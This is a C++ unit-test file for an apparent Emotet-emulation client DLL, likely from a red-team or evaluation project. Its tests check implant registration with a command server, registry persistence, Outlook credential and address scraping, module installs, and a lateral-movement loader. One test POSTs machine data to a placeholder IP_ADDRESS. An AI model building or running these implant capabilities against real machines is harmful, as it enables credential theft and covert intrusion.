#include "pch.h"
#include "..\EmotetClientDLL\persistence.h"
#include "..\EmotetClientDLL\hostdiscovery.h"
#include "..\EmotetClientDLL\latmove.h"
#include "..\EmotetClientDLL\loadoutlookscraper.h"
#include "..\EmotetClientDLL\dllmain.h"
#include "..\EmotetClientDLL\comms.h"

//create test fixture for comms
struct EmotetCommsTest : testing::Test
{
	EmotetComms* commsTest;
	EmotetCommsTest() {
		commsTest = new EmotetComms;
	}

	~EmotetCommsTest() {
		delete commsTest;
	}
};

TEST_F(EmotetCommsTest, registerImplant) {
	// Verify that implant was registered successfully
	EXPECT_TRUE(commsTest->registerImplant());
}

TEST_F(EmotetCommsTest, InstallOutlookModule) {
	string module = "outlook";
	string moduleName = "Outlook.dll";
	string modulePath = commsTest->getModulePath(moduleName);
	EXPECT_TRUE(commsTest->installModule(module, modulePath));
}

TEST_F(EmotetCommsTest, InstallTricbotModule) {
	string module = "WNetval";
	string moduleName = "WNetval.zip";
	string modulePath = commsTest->getModulePath(moduleName);
	EXPECT_TRUE(commsTest->installModule(module, modulePath));
}

TEST(EmotetClientDLLTests, GetOSVersionReturnsObject) {
	// Verify that GetOSVersion works by looking at the object size
	// and checking that the size is not 0
	EXPECT_NE(0, GetOSVersion().dwOSVersionInfoSize);
}

TEST(EmotetClientDLLTests, getUserRootDirectory) {
	// Verify that implant was registered successfully
	string userRootDir = getUserRootDirectory();
	EXPECT_TRUE(strstr(userRootDir.c_str(), "C:\\"));
}

TEST(EmotetClientDLLTests, GetNtProductTypeSuccess) {
	// Verify that GetNTProductType returns true for success
	// and NtProductType is no longer Undefined

	// Prepare
	NT_PRODUCT_TYPE NtProductType = Undefined;

	EXPECT_TRUE(GetNtProductType(&NtProductType));

	EXPECT_NE(Undefined, NtProductType);
}

TEST(EmotetClientDLLTests, collectOSDataReturnsOSInfo) {
	// Verify that collectOSData returns value and it is non zero, and does not return -1
	EXPECT_LT(0, collectOSData());
}

TEST(EmotetClientDLLTests, generateProcessDataSucess) {
	// Verify that generateProcessData returns true and the 
	// string has valid running process
	WCHAR* processesInfo = (WCHAR*)calloc(PROCESS_LIST_SIZE, sizeof(WCHAR)); // allocate memory in heap
	EXPECT_TRUE(generateProcessData(processesInfo));
	EXPECT_TRUE(wcsstr(processesInfo, L"[System Process]"));
}

TEST(EmotetClientDLLTests, getCurrentSessionSuccess) {
	// Verify that getCurrentSession retuns value bigger than -1
	EXPECT_LE(0, getCurrentSessionId());
}

TEST_F(EmotetCommsTest, HostDiscoverySuccess) {
	// Verify that implant was registered successfully
	EXPECT_TRUE(commsTest->registerImplant());
	cout << "success" << endl;
	// Verify that Host discovery returns true for success
	EXPECT_TRUE(HostDiscovery(commsTest));
}

TEST_F(EmotetCommsTest, InstallPersistence) {
	// Verify that Registry run value is created
	EXPECT_TRUE(InstallPersistence(commsTest));
}
TEST_F(EmotetCommsTest, ModulePath) {
	// Verify that implant was registered successfully
	string moduleName = "Outlook.dll";
	cout << commsTest->getModulePath(moduleName) << endl;
	EXPECT_TRUE(strstr(commsTest->getModulePath(moduleName).c_str(), "wizard_spider\\Resources\\Emotet\\EmotetClientDLL"));
}

TEST_F(EmotetCommsTest, LoadOutlookScraperSuccess) {
	string moduleName = "Outlook.dll";
	string modulePath = commsTest->getModulePath(moduleName);
	// Verify that OutlookScraper is loaded successfully returns 0 for success
	EXPECT_TRUE(loadOutlookScraper(commsTest, modulePath));
}

TEST_F(EmotetCommsTest, getCredentialsOutlookScraper) {
	// Outlook Scraper credential function works
	EXPECT_TRUE(getCredentialsOutlookScraper(commsTest, false, false));
}
TEST_F(EmotetCommsTest, getEmailAddressesOutlookScraper) {
	// Outlook Scraper email addresses function works
	EXPECT_TRUE(getEmailAddressesOutlookScraper(commsTest, false, false));
}

TEST_F(EmotetCommsTest, GenerateMachineID) {
	// Generate Machine ID and verify that it works on Dragon
	string machineID = commsTest->generateMachineID();
	EXPECT_TRUE(strstr(machineID.c_str(), "dragon"));
	// Verify lengths
	EXPECT_EQ(machineID.length(), commsTest->getMachineIDLength(machineID));
}

TEST_F(EmotetCommsTest, getTask) {
	// Generate Machine ID and verify that it works on Dragon
	string task = commsTest->getTask();
	EXPECT_TRUE((task == "") || (task == "1") || (task == "2"));
}

TEST_F(EmotetCommsTest, CanSendPostRequest) {
	string url = "/output";
	// Generate Machine ID and verify that it works on Dragon
	string machineID = commsTest->generateMachineID();
	string path = "";
	string response = commsTest->sendRequest(L"POST", IP_ADDRESS, url, machineID, path);
	// Verify that sendRequest returned the same url as confirmation
	EXPECT_TRUE(strstr(response.c_str(), "successfully set task output"));
}

TEST_F(EmotetCommsTest, LoadLatMovementDLL) {
	string moduleName = "LatMovementDLL.dll";
	string modulePath = commsTest->getModulePath(moduleName);
	EXPECT_TRUE(loadLatMovementModule(commsTest, moduleName));
}
